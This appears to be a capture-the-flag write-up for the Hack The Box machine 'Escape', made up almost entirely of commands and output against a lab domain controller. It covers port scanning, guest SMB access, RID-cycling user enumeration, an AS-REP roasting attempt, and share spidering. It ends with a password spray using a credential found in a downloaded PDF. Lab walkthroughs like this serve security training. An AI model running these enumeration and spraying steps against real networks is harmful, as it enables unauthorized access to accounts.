---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Escape





```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.202 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-19 19:05 CET
Initiating SYN Stealth Scan at 19:05
Scanning 10.10.11.202 [65535 ports]
Discovered open port 135/tcp on 10.10.11.202
Discovered open port 139/tcp on 10.10.11.202
Discovered open port 445/tcp on 10.10.11.202
Discovered open port 53/tcp on 10.10.11.202
Discovered open port 49689/tcp on 10.10.11.202
Discovered open port 389/tcp on 10.10.11.202
SYN Stealth Scan Timing: About 22.90% done; ETC: 19:07 (0:01:44 remaining)
Discovered open port 49752/tcp on 10.10.11.202
Discovered open port 636/tcp on 10.10.11.202
Discovered open port 49732/tcp on 10.10.11.202
Discovered open port 88/tcp on 10.10.11.202
Discovered open port 88/tcp on 10.10.11.202
SYN Stealth Scan Timing: About 31.44% done; ETC: 19:08 (0:02:13 remaining)
SYN Stealth Scan Timing: About 46.69% done; ETC: 19:08 (0:01:44 remaining)
Discovered open port 49690/tcp on 10.10.11.202
Discovered open port 3269/tcp on 10.10.11.202
Discovered open port 593/tcp on 10.10.11.202
SYN Stealth Scan Timing: About 61.94% done; ETC: 19:08 (0:01:14 remaining)
Discovered open port 1433/tcp on 10.10.11.202
SYN Stealth Scan Timing: About 77.19% done; ETC: 19:08 (0:00:45 remaining)
Discovered open port 464/tcp on 10.10.11.202
Discovered open port 3268/tcp on 10.10.11.202
Discovered open port 49713/tcp on 10.10.11.202
Discovered open port 49667/tcp on 10.10.11.202
Discovered open port 9389/tcp on 10.10.11.202
Discovered open port 5985/tcp on 10.10.11.202
Completed SYN Stealth Scan at 19:08, 192.97s elapsed (65535 total ports)
Nmap scan report for 10.10.11.202
Host is up, received user-set (0.13s latency).
Scanned at 2025-02-19 19:05:34 CET for 192s
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
1433/tcp  open  ms-sql-s         syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49689/tcp open  unknown          syn-ack ttl 127
49690/tcp open  unknown          syn-ack ttl 127
49713/tcp open  unknown          syn-ack ttl 127
49732/tcp open  unknown          syn-ack ttl 127
49752/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 193.11 seconds
           Raw packets sent: 196703 (8.655MB) | Rcvd: 249 (14.596KB)

```



```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.202
	[*] Open ports: 53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49689,49690,49713,49732,49752

[*] Ports copied to clipboard
```





```bash
❯ nmap -sCV -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49689,49690,49713,49732,49752 10.10.11.202 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-19 19:09 CET
Nmap scan report for sequel.htb (10.10.11.202)
Host is up (0.15s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-20 02:10:13Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2025-02-20T02:11:50+00:00; +8h00m48s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2025-02-20T02:11:51+00:00; +8h00m48s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.11.202:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.10.11.202:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-02-20T01:57:03
|_Not valid after:  2055-02-20T01:57:03
|_ssl-date: 2025-02-20T02:11:50+00:00; +8h00m48s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2025-02-20T02:11:50+00:00; +8h00m48s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-02-20T02:11:51+00:00; +8h00m48s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
49732/tcp open  msrpc         Microsoft Windows RPC
49752/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-02-20T02:11:11
|_  start_date: N/A
|_clock-skew: mean: 8h00m47s, deviation: 0s, median: 8h00m47s

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   128.62 ms 10.10.16.1
2   192.82 ms sequel.htb (10.10.11.202)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.88 seconds
```



```bash
❯ nxc smb 10.10.11.202
SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
❯ ldapsearch -x -H ldap://10.10.11.202 -s base | grep defaultNamingContext
defaultNamingContext: DC=sequel,DC=htb
```



```bash
❯ cat /etc/hosts | grep sequel.htb
10.10.11.202 sequel.htb DC.sequel.htb
```





```bash
❯ nxc smb 10.10.11.202 -u 'guest' -p ''
SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\guest: 
```



```bash
❯ ridenum 10.10.11.202 500 2500 guest ''
[*] Attempting lsaquery first...This will enumerate the base domain SID
[*] Successfully enumerated base domain SID. Printing information: 
Domain Name: sequel
Domain Sid: S-1-5-21-4078382237-1492182817-2568127209
[*] Moving on to extract via RID cycling attack.. 
[*] Enumerating user accounts.. This could take a little while.
Account name: sequel\Administrator
Account name: sequel\Guest
Account name: sequel\krbtgt
Account name: sequel\DC$
Account name: sequel\Tom.Henn
Account name: sequel\Brandon.Brown
Account name: sequel\Ryan.Cooper
Account name: sequel\sql_svc
Account name: sequel\James.Roberts
Account name: sequel\Nicole.Thompson
[*] RIDENUM has finished enumerating user accounts...
```





```bash
❯ cat users.txt
Account name: sequel\Administrator
Account name: sequel\Guest
Account name: sequel\krbtgt
Account name: sequel\DC$
Account name: sequel\Tom.Henn
Account name: sequel\Brandon.Brown
Account name: sequel\Ryan.Cooper
Account name: sequel\sql_svc
Account name: sequel\James.Roberts
Account name: sequel\Nicole.Thompson

❯ cat users.txt | awk '{print $NF}' FS='\\' | sponge users.txt

❯ cat users.txt
Administrator
Guest
krbtgt
DC$
Tom.Henn
Brandon.Brown
Ryan.Cooper
sql_svc
James.Roberts
Nicole.Thompson
```



```bash
❯ impacket-GetNPUsers -no-pass -usersfile users.txt sequel.htb/ 2>/dev/null
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Tom.Henn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Brandon.Brown doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Ryan.Cooper doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sql_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User James.Roberts doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Nicole.Thompson doesn't have UF_DONT_REQUIRE_PREAUTH set
```





```bash
❯ nxc smb 10.10.11.202 -u 'guest' -p '' --shares
SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\guest: 
SMB         10.10.11.202    445    DC               [*] Enumerated shares
SMB         10.10.11.202    445    DC               Share           Permissions     Remark
SMB         10.10.11.202    445    DC               -----           -----------     ------
SMB         10.10.11.202    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.202    445    DC               C$                              Default share
SMB         10.10.11.202    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.202    445    DC               NETLOGON                        Logon server share 
SMB         10.10.11.202    445    DC               Public          READ            
SMB         10.10.11.202    445    DC               SYSVOL                          Logon server share 
```



```bash
❯ nxc smb 10.10.11.202 -u 'guest' -p '' -M spider_plus
SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\guest: 
SPIDER_PLUS 10.10.11.202    445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.10.11.202    445    DC               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.10.11.202    445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS 10.10.11.202    445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.10.11.202    445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.10.11.202    445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.10.11.202    445    DC               [*]  OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus
SMB         10.10.11.202    445    DC               [*] Enumerated shares
SMB         10.10.11.202    445    DC               Share           Permissions     Remark
SMB         10.10.11.202    445    DC               -----           -----------     ------
SMB         10.10.11.202    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.202    445    DC               C$                              Default share
SMB         10.10.11.202    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.202    445    DC               NETLOGON                        Logon server share 
SMB         10.10.11.202    445    DC               Public          READ            
SMB         10.10.11.202    445    DC               SYSVOL                          Logon server share 
SPIDER_PLUS 10.10.11.202    445    DC               [+] Saved share-file metadata to "/tmp/nxc_hosted/nxc_spider_plus/10.10.11.202.json".
SPIDER_PLUS 10.10.11.202    445    DC               [*] SMB Shares:           6 (ADMIN$, C$, IPC$, NETLOGON, Public, SYSVOL)
SPIDER_PLUS 10.10.11.202    445    DC               [*] SMB Readable Shares:  2 (IPC$, Public)
SPIDER_PLUS 10.10.11.202    445    DC               [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.10.11.202    445    DC               [*] Total folders found:  0
SPIDER_PLUS 10.10.11.202    445    DC               [*] Total files found:    1
SPIDER_PLUS 10.10.11.202    445    DC               [*] File size average:    48.39 KB
SPIDER_PLUS 10.10.11.202    445    DC               [*] File size min:        48.39 KB
SPIDER_PLUS 10.10.11.202    445    DC               [*] File size max:        48.39 KB
```





```bash
❯ cat /tmp/nxc_hosted/nxc_spider_plus/10.10.11.202.json | jq
{
  "Public": {
    "SQL Server Procedures.pdf": {
      "atime_epoch": "2022-11-19 12:50:54",
      "ctime_epoch": "2022-11-17 20:47:32",
      "mtime_epoch": "2022-11-19 12:51:25",
      "size": "48.39 KB"
    }
  }
}
```



```bash
❯ nxc smb 10.10.11.202 -u 'guest' -p '' --share 'Public' --get-file 'SQL Server Procedures.pdf' SQLServerProcedures.pdf
SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\guest: 
SMB         10.10.11.202    445    DC               [*] Copying "SQL Server Procedures.pdf" to "SQLServerProcedures.pdf"
SMB         10.10.11.202    445    DC               [+] File "SQL Server Procedures.pdf" was downloaded to "SQLServerProcedures.pdf"
```



<figure><img src="../../.gitbook/assets/imagen (422).png" alt=""><figcaption></figcaption></figure>





```bash
❯ echo 'PublicUser' >> users.txt

❯ nxc smb 10.10.11.202 -u users.txt -p 'GuestUserCantWrite1' --continue-on-success
SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [-] sequel.htb\Administrator:GuestUserCantWrite1 STATUS_LOGON_FAILURE 
SMB         10.10.11.202    445    DC               [-] sequel.htb\Guest:GuestUserCantWrite1 STATUS_LOGON_FAILURE 
SMB         10.10.11.202    445    DC               [-] sequel.htb\krbtgt:GuestUserCantWrite1 STATUS_LOGON_FAILURE 
SMB         10.10.11.202    445    DC               [-] sequel.htb\DC$:GuestUserCantWrite1 STATUS_LOGON_FAILURE 
SMB         10.10.11.202    445    DC               [-] sequel.htb\Tom.Henn:GuestUserCantWrite1 STATUS_LOGON_FAILURE 
SMB         10.10.11.202    445    DC               [-] sequel.htb\Brandon.Brown:GuestUserCantWrite1 STATUS_LOGON_FAILURE 
SMB         10.10.11.202    445    DC               [-] sequel.htb\Ryan.Cooper:GuestUserCantWrite1 STATUS_LOGON_FAILURE 
SMB         10.10.11.202    445    DC               [-] sequel.htb\sql_svc:GuestUserCantWrite1 STATUS_LOGON_FAILURE 
SMB         10.10.11.202    445    DC               [-] sequel.htb\James.Roberts:GuestUserCantWrite1 STATUS_LOGON_FAILURE 
SMB         10.10.11.202    445    DC               [-] sequel.htb\Nicole.Thompson:GuestUserCantWrite1 STATUS_LOGON_FAILURE 
SMB         10.10.11.202    445    DC               [+] sequel.htb\PublicUser:GuestUserCantWrite1 (Guest)
```





























































































